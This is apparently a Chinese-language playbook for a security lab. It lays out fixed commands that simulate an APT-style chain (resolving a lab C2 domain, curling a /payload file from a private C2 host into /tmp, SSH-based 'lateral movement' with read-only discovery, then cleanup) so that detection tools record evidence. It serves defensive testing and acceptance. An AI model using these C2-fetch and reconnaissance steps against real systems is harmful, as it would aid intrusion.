# 攻击场景与复现剧本

## 文档目的

本文件定义用于验收与演示的固定攻击复现剧本，明确每一步的动作、产生的证据类型、以及在系统中的预期可观测输出。

本剧本不包含漏洞利用、提权、持久化、破坏性操作，仅用于生成可控证据并形成可讲述的“类 APT”链路。

## 读者对象

- 靶场负责人（负责复现与证据准备）
- 负责演示的同学（用于讲述与现场操作）
- 测试负责人（用于验收用例复用）

## 引用关系

- 运维与靶场：`../90-运维与靶场/91-靶场部署.md`、`../90-运维与靶场/92-一键编排.md`
- C2 与证据点：`../90-运维与靶场/93-C2部署与证据点.md`
- 验收清单：`../90-运维与靶场/94-验证清单.md`
- 字段口径：`../80-规范/81-ECS字段规范.md`

## 1. 靶场角色与前置条件

### 1.1 节点角色

本剧本使用以下节点角色（名称固定）：

- `center-01`：中心机
- `client-01`：客户机实例 1
- `client-02`：客户机实例 2
- `client-03`：客户机实例 3
- `client-04`：客户机实例 4
- `c2-01`：命令与控制服务器

### 1.2 前置条件

1. 所有节点已按 `92-一键编排.md` 启动。
2. 中心机注册表中可见 `client-01..04`。
3. 客户机侧采集链路正常：Falco、Filebeat、Suricata 均在运行并能通过 Client API 拉取数据。

## 2. 攻击链步骤（动作-证据-系统输出）

所有命令均在靶场宿主机 `10.92.35.13` 上执行（不是在容器内执行）。

### Step A C2 解析与连通

动作（固定命令）：

```bash
dig @10.92.35.50 c2.lab.local +noall +answer +time=1 +tries=1
curl -s http://10.92.35.51/payload && echo
```

预期证据（固定）：

- Suricata：出现 53 与 80 相关网络事件；DNS 事件中包含 `c2.lab.local`；HTTP 事件中包含 `/payload`

系统预期输出（固定）：

- 至少一个客户机实例的 `GET /suricata` 返回 `total>0`

### Step B 下载载荷到受害机

动作（固定命令）：

```bash
mkdir -p /tmp/apt-demo
curl -s http://10.92.35.51/payload -o /tmp/apt-demo/payload.txt
sha256sum /tmp/apt-demo/payload.txt
```

预期证据（固定）：

- Suricata：HTTP 请求 `/payload`
- Falco：进程执行与文件写入（`curl` 写入 `/tmp/apt-demo/payload.txt`）

系统预期输出（固定）：

- 至少一个客户机实例的 `GET /falco` 返回 `total>0`
- 至少一个客户机实例的 `GET /suricata` 返回 `total>0`

### Step C 执行良性脚本

动作（固定命令）：

```bash
cat > /tmp/apt-demo/run.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
date
echo "[demo] benign execution"
echo "[demo] host=$(hostname) user=$(id -un)"
EOF
chmod +x /tmp/apt-demo/run.sh
/tmp/apt-demo/run.sh | tee /tmp/apt-demo/output.log
```

预期证据（固定）：

- Falco：`bash` 进程执行、创建与写入 `output.log`

系统预期输出（固定）：

- 至少一个客户机实例的 `GET /falco` 返回 `total>0`

### Step D SSH 会话模拟横向移动

动作（固定命令）：

```bash
ssh ubuntu@10.92.35.13 "hostname; whoami; date"
```

预期证据（固定）：

- Filebeat：采集到 SSH 登录与认证相关日志（Ubuntu 为 `/var/log/auth.log`）

系统预期输出（固定）：

- 至少一个客户机实例的 `GET /filebeat` 返回 `total>0`

### Step E 只读发现与收集

动作（固定命令）：

```bash
ssh ubuntu@10.92.35.13 "ip -br a; ss -lntup | head; ls -la /tmp/apt-demo | head"
```

预期证据（固定）：

- Filebeat：SSH 会话相关日志持续增长
- Falco：只读探测行为与相关进程行为

系统预期输出（固定）：

- 至少一个客户机实例的 `GET /filebeat` 返回 `total>0`
- 至少一个客户机实例的 `GET /falco` 返回 `total>0`

### Step F 清理回滚

动作（固定命令）：

```bash
rm -rf /tmp/apt-demo
```

预期证据（固定）：

- Falco：删除目录与文件行为

系统预期输出（固定）：

- 至少一个客户机实例的 `GET /falco` 返回 `total>0`

## 3. 复现后的验收关联（固定顺序）

本剧本执行完成后，按以下顺序执行验收：

1. 按 `../90-运维与靶场/94-验证清单.md` 验证采集与中心机入库
2. 在中心机执行一次事件检索与告警检索：
   - `POST /api/v1/events/search`
   - `POST /api/v1/findings/search`
